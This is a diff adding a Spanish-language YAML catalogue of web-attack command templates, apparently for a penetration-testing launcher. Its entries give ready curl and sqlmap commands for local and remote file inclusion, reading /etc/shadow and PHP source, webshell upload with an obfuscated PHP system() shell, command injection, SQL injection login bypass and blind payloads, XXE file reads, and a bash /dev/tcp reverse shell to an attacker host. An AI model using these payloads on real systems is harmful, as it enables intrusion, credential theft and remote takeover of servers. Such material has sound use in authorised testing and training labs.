@@ -1,0 +1,241 @@
+﻿tools:
+  - id: lfi_basic
+    name: "LFI - Local File Inclusion"
+    description: "Prueba LFI en parametro de URL para leer ficheros del servidor"
+    command: "curl -s 'http://{target}/{path}?{param}={payload}'"
+    params:
+      - name: target
+        label: "Target (IP:Puerto)"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: path
+        label: "Path de la app"
+        placeholder: "index.php"
+        required: true
+      - name: param
+        label: "Parametro vulnerable"
+        placeholder: "page"
+        required: true
+      - name: payload
+        label: "Payload LFI"
+        placeholder: "../../../etc/passwd"
+        default: "../../../etc/passwd"
+    tags: [web, lfi, file-inclusion, linux]
+    notes: "Probar: ../../../../etc/shadow, /proc/self/environ, /var/log/apache2/access.log"
+  - id: php_filter_b64
+    name: "LFI - PHP Wrapper (leer codigo fuente)"
+    description: "Usa PHP filter wrapper para leer codigo fuente de ficheros PHP en base64"
+    command: "curl -s 'http://{target}/{path}?{param}=php://filter/convert.base64-encode/resource={file}' | base64 -d"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: path
+        label: "Path"
+        placeholder: "index.php"
+        required: true
+      - name: param
+        label: "Parametro LFI"
+        placeholder: "page"
+        required: true
+      - name: file
+        label: "Fichero a leer"
+        placeholder: "config.php"
+        required: true
+    tags: [web, lfi, php, wrapper, source-code]
+  - id: rfi_basic
+    name: "RFI - Remote File Inclusion"
+    description: "Incluye un fichero PHP malicioso desde servidor remoto para RCE"
+    command: "curl -s 'http://{target}/{path}?{param}=http://{lhost}/shell.php&cmd=id'"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: path
+        label: "Path vulnerable"
+        placeholder: "index.php"
+        required: true
+      - name: param
+        label: "Parametro RFI"
+        placeholder: "page"
+        required: true
+      - name: lhost
+        label: "IP atacante con HTTP server"
+        placeholder: "10.10.14.1"
+        required: true
+    tags: [web, rfi, remote-inclusion, rce, php]
+    notes: "En Kali: echo shell.php y python3 -m http.server 80"
+  - id: file_upload_webshell
+    name: "File Upload - Webshell PHP"
+    description: "Sube una webshell PHP a traves de funcionalidad de upload vulnerable"
+    command: "curl -X POST 'http://{target}/{upload_path}' -F 'file=@shell.php'"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: upload_path
+        label: "Endpoint de upload"
+        placeholder: "/upload.php"
+        required: true
+    tags: [web, file-upload, webshell, php, rce]
+    notes: "Crear shell.php: echo '<?php system($_REQUEST[chr(99).chr(109).chr(100)]); ?>' > shell.php. Bypasses: .phtml .php5 .phar"
+  - id: cmd_injection
+    name: "Command Injection - Deteccion"
+    description: "Prueba de inyeccion de comandos OS en parametros web"
+    command: "curl -s 'http://{target}/{path}?{param}=127.0.0.1%3Bid'"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: path
+        label: "Path vulnerable"
+        placeholder: "ping.php"
+        required: true
+      - name: param
+        label: "Parametro vulnerable"
+        placeholder: "ip"
+        required: true
+    tags: [web, command-injection, rce, os]
+    notes: "Payloads: 127.0.0.1;id | &&id | |id | $(id). ; = %3B, | = %7C, & = %26"
+  - id: sqli_auth_bypass
+    name: "SQLi - Bypass Autenticacion"
+    description: "Payloads SQLi para bypassear formularios de login"
+    command: "curl -X POST 'http://{target}/{login_path}' -d 'username=admin%27--&password=x'"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: login_path
+        label: "Path del login"
+        placeholder: "/login"
+        required: true
+    tags: [web, sqli, auth-bypass, login]
+    notes: "Payloads en campo usuario: ' OR '1'='1 | admin'-- | ' OR 1=1 -- | admin' #"
+  - id: sqli_union_cols
+    name: "SQLi - UNION Detectar columnas"
+    description: "Determina el numero de columnas para inyeccion UNION-based con ORDER BY"
+    command: "curl -s 'http://{target}/{path}?{param}=1 ORDER BY {num}--'"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: path
+        label: "Path"
+        placeholder: "item.php"
+        required: true
+      - name: param
+        label: "Parametro vulnerable"
+        placeholder: "id"
+        required: true
+      - name: num
+        label: "Numero de columna a probar"
+        placeholder: "1"
+        required: true
+    tags: [web, sqli, union, columns, manual]
+    notes: "Incrementar hasta error = N-1 columnas. Alternativa: UNION SELECT NULL,NULL--"
+  - id: sqli_blind_time
+    name: "SQLi - Blind Time-Based"
+    description: "SQLi ciega basada en tiempo cuando no hay salida visible"
+    command: "curl -s -o /dev/null -w '%{time_total}' 'http://{target}/{path}?{param}=1 AND SLEEP(5)--'"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: path
+        label: "Path"
+        placeholder: "item.php"
+        required: true
+      - name: param
+        label: "Parametro"
+        placeholder: "id"
+        required: true
+    tags: [web, sqli, blind, time-based]
+    notes: "MySQL: SLEEP(5) | PostgreSQL: pg_sleep(5) | MSSQL: WAITFOR DELAY '0:0:5'"
+  - id: sqlmap_url
+    name: "SQLMap - GET Parameter"
+    description: "Deteccion y explotacion automatica de SQLi en parametro GET"
+    command: "sqlmap -u 'http://{target}/{path}?{param}=1' --dbs --batch --level 3 --risk 2"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: path
+        label: "Path"
+        placeholder: "item.php"
+        required: true
+      - name: param
+        label: "Parametro GET"
+        placeholder: "id"
+        required: true
+    tags: [web, sqli, sqlmap, automated]
+  - id: sqlmap_request
+    name: "SQLMap - Request Burp"
+    description: "SQLMap con fichero de peticion HTTP exportado de Burp Suite"
+    command: "sqlmap -r {request_file} --dbs --batch --level 3"
+    params:
+      - name: request_file
+        label: "Fichero de peticion (de Burp)"
+        placeholder: "request.txt"
+        required: true
+    tags: [web, sqli, sqlmap, burp, post]
+  - id: xxe_basic
+    name: "XXE - XML External Entity"
+    description: "Payload XXE para leer ficheros del servidor en endpoints que parsean XML"
+    command: "curl -X POST 'http://{target}/{path}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>'"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: path
+        label: "Endpoint XML"
+        placeholder: "/api/upload"
+        required: true
+    tags: [web, xxe, xml, file-read]
+    notes: "Targets: /etc/passwd, /etc/shadow, /proc/self/environ, ficheros config."
+  - id: web_reverse_shell
+    name: "Reverse Shell desde Webshell"
+    description: "Obtiene reverse shell desde ejecucion de codigo en servidor web"
+    command: "curl 'http://{target}/{shell_path}?cmd=bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/{lhost}/{lport}%200>%261%27'"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: shell_path
+        label: "Ruta de la webshell"
+        placeholder: "/uploads/shell.php"
+        required: true
+      - name: lhost
+        label: "IP atacante"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: lport
+        label: "Puerto listener"
+        placeholder: "4444"
+        default: "4444"
+    tags: [web, reverse-shell, webshell, rce]
+    notes: "Primero abrir listener: nc -nvlp {lport}"
+  - id: burp_proxy
+    name: "Burp Suite - Proxy curl"
+    description: "Configura curl para usar Burp Suite como proxy interceptor"
+    command: "curl --proxy http://127.0.0.1:8080 -k 'https://{target}/{path}'"
+    params:
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.16"
+        required: true
+      - name: path
+        label: "Path"
+        placeholder: "/"
+        required: true
+    tags: [web, burp, proxy, intercept]
+    notes: "Burp activo en 127.0.0.1:8080. Instalar certificado CA en el browser."
